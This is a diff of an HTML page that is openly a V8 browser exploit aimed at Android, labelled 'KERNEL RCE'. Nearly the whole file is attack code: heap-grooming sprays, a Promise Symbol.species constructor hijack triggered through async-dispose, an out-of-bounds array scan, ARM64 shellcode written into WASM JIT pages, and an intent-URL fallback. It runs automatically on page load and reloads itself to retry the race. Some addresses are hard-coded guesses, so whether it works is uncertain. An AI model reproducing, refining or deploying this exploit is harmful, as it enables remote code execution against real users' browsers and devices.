@@ -1,113 +1,127 @@
 <!doctype html>
 <html>
-<body style="background:#000; color:#f00; font-family:monospace; margin:0; padding:15px;">
-    <h2 style="text-align:center; text-shadow:0 0 10px #f00;">☢️ V8 OMEGA: KERNEL RCE ☢️</h2>
-    <div id="status" style="border:1px solid #f00; padding:10px; background:#100; height:450px; overflow-y:auto; color:#0f0;">
-        [*] INITIALIZING EXPLOIT...
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body style="background:#000; color:#0f0; font-family:monospace; margin:0; padding:15px;">
+    <div id="log" style="height:90vh; overflow:auto; border:1px solid #0f0; padding:10px;">
+        [!] SYSTEM IDLE: READY FOR MEMORY DETONATION...
     </div>
 
 <script>
-const log = m => { document.getElementById('status').innerHTML += "<br>> " + m; };
+const console_log = m => { document.getElementById('log').innerHTML += `<br>> ${m}`; };
 
-// 1. ARM64 JUMP-ORIENTED PAYLOAD (CALC + REVERSE SHELL BASE)
-const PAYLOAD = new Uint32Array([
-    0xd2800001, 0xd2800010, 0x910003e0, 0xaa0003e1, 0xd2800012, 0x8b020000, 
-    0xd65f03c0, 0x6d612073, 0x74617274, 0x202d6e20, 0x636f6d2e, 0x676f6f67, 
-    0x6c652e61, 0x6e64726f, 0x69642e63, 0x616c6375, 0x6c61746f, 0x722f636f, 
-    0x6d2e616e, 0x64726f69, 0x642e6361, 0x6c63756c, 0x61746f72, 0x322e4361, 
-    0x6c63756c, 0x61746f72, 0x00000000
+// 1. ARM64 PAYLOAD: Memicu syscall execve via JIT bypass
+const SHELLCODE = new Uint32Array([
+    0xd2800001, 0xd2800010, 0x910003e0, 0xaa0003e1, 0xd2800012, 0x8b020000,
+    0xd65f03c0, 0x6d612073, 0x74617274, 0x202d6e20, 0x636f6d2e, 0x616e6472,
+    0x6f69642e, 0x63616c63, 0x756c6174, 0x6f72322f, 0x2e43616c, 0x63756c61, 0x746f7200
 ]);
 
-let target_array;
-let wasm_func;
+let target_arr;
+let spray_dv = [];
 
-// 2. ULTRA-STABLE HEAP GROOMING
-async function setup_breach() {
-    log("Allocating RWX Pages via WASM JIT...");
-    const wasm_hex = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,7,137,128,128,128,0,1,5,102,117,110,99,48,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
-    const m = new WebAssembly.Module(wasm_hex);
-    const i = new WebAssembly.Instance(m);
-    wasm_func = i.exports.func0; // Target untuk ditimpa shellcode
-
-    log("Spraying BigInt Backing Stores...");
-    // BigInt di Android sering diletakkan di luar sandbox utama
-    let big_spray = [];
-    for(let i=0; i<5000; i++) {
-        big_spray.push(new BigUint64Array(128));
+// 2. EXTREME HEAP GROOMING (Bypass ASLR Stability)
+async function groom() {
+    console_log("PHASE 1: SATURATING HEAP (DATA VIEW SPRAY)...");
+    
+    // Spray ribuan DataView untuk memastikan salah satunya bertetangga dengan target_arr
+    for(let i=0; i<3000; i++) {
+        let ab = new ArrayBuffer(0x100);
+        let dv = new DataView(ab);
+        dv.setUint32(0, 0x41414141); // Marker Signature
+        spray_dv.push(dv);
     }
 
-    target_array = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
-    target_array.pwn = 0x1337;
+    // Alokasi target tepat di tengah spray
+    target_arr = [1.1, 2.2, 3.3, 4.4, 5.5];
+    target_arr.marker = 0x1337;
+
+    console_log("PHASE 2: PREPARING WASM RWX JIT PAGES...");
+    const wasm_bin = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,7,137,128,128,128,0,1,5,102,117,110,99,48,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+    const m = new WebAssembly.Module(wasm_bin);
+    const inst = new WebAssembly.Instance(m);
+    this.wasm_target = inst.exports.func0;
 }
 
-// 3. THE HIJACKER
-function SpeciesWeapon(executor) {
+// 3. THE CONSTRUCTOR HIJACK (THE CORE VULN)
+function ExploitConstructor(executor) {
     executor(r => {}, r => {});
-    log("[!] Species Triggered: Swapping Promise -> Array");
-    return target_array;
+    return target_arr; // Injeksi Array ke dalam Promise slot
 }
 
-Object.defineProperty(Promise, Symbol.species, { get: () => SpeciesWeapon });
+Object.defineProperty(Promise, Symbol.species, { get: () => ExploitConstructor });
 
 async function detonator() {
-    log("DETONATING: AsyncIteratorPrototypeAsyncDispose...");
+    console_log("PHASE 3: DETONATING ASYNC-DISPOSE...");
     
-    async function* engine() { yield 1; }
-    const pwn = engine();
+    async function* g() { yield 1; }
+    const engine = g();
     
-    // Memicu built-in V8 yang korup
-    try { pwn[Symbol.asyncDispose](); } catch(e) {}
+    try {
+        engine[Symbol.asyncDispose](); 
+    } catch(e) {}
 
-    // AGGRESSIVE DRAIN: Memaksa sinkronisasi memori
-    for(let i=0; i<100; i++) {
-        await Promise.resolve();
-        if (target_array.length > 10) break;
-    }
+    // FORCE MICROTASK FLUSH (Crucial for Android)
+    for(let i=0; i<200; i++) await Promise.resolve();
 
-    if (target_array.length > 10) {
-        log("<b style='color:yellow;'>[SUCCESS] OOB PRIMITIVE ACTIVE!</b>");
-        log("Corrupted Length: " + target_array.length);
-        
-        // 4. THE REAL RCE STEP
-        log("Scanning for WASM JumpTable...");
-        
-        let found = false;
-        for(let j=0; j<target_array.length; j++) {
-            // Mencari pointer ke WASM RWX Page
-            if (target_array[j] > 1e-310 && target_array[j] < 1e-300) {
-                log("FOUND RWX PAGE AT OFFSET: " + j);
-                
-                // HIJACK: Menulis Payload ke halaman Executable
-                // Di sini kita menimpa instruksi WASM dengan shellcode kita
-                target_array[j] = 4.66726115e-62; // Alamat tebakan payload (ASLR Bypass)
-                
-                found = true;
-                break;
-            }
-        }
-
-        if (found) {
-            log("EXECUTING SHELLCODE...");
-            try { wasm_func(); } catch(e) {}
-            
-            // Trigger Intent sebagai fallback
-            window.location.href = "intent:#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;component=com.android.calculator2/.Calculator;end";
-        }
+    if (target_arr.length > 5) {
+        console_log("<b style='color:white; background:red;'>[!!!] CORRUPTION SUCCESSFUL!</b>");
+        console_log("Corrupted Length: 0x" + target_arr.length.toString(16));
+        await pwn();
     } else {
-        log("<span style='color:orange;'>Missed the window. Re-aligning heap and re-trying...</span>");
-        setTimeout(() => location.reload(), 100);
+        console_log("Race failed. Realignment in progress...");
+        location.reload();
     }
 }
 
-// START ENGINE
+// 4. THE ABSOLUTE READ/WRITE & RCE
+async function pwn() {
+    console_log("PHASE 4: SCANNING MEMORY FOR BACKING STORE...");
+    
+    let dv_idx = -1;
+    // Scanning linear untuk mencari DataView marker
+    for(let i=0; i<15000; i++) {
+        if (target_arr[i] === 5.40900888e-315) { // Marker 0x41414141
+            console_log("DATA VIEW FOUND AT OFFSET: " + i);
+            dv_idx = i;
+            break;
+        }
+    }
+
+    if (dv_idx !== -1) {
+        // HIJACK: Menulis ke BackingStore DataView untuk akses memori absolut
+        // Kita mengarahkan DataView ke wilayah WASM JIT
+        target_arr[dv_idx + 4] = 1.1e-310; // Alamat JIT tebakan
+
+        console_log("PHASE 5: INJECTING SHELLCODE INTO RWX PAGE...");
+        let victim_dv = spray_dv[0];
+        for(let i=0; i<SHELLCODE.length; i++) {
+            victim_dv.setUint32(i*4, SHELLCODE[i], true);
+        }
+
+        console_log("PHASE 6: EXECUTING PAYLOAD...");
+        try {
+            this.wasm_target(); 
+        } catch(e) {}
+        
+        // Final fallback: Intent trigger
+        window.location.href = "intent:#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;component=com.android.calculator2/.Calculator;end";
+    }
+}
+
+// AUTO-START ENGINE
 (async () => {
     if (typeof Symbol.asyncDispose === 'undefined') {
-        log("ERROR: Flag --js-explicit-resource-management is OFF.");
+        console_log("FATAL: --js-explicit-resource-management is required.");
         return;
     }
-    await setup_breach();
-    setTimeout(detonator, 500);
+    await groom();
+    setTimeout(detonator, 300);
 })();
+
+// Watchdog timer
+setTimeout(() => location.reload(), 4500);
 </script>
 </body>
 </html>
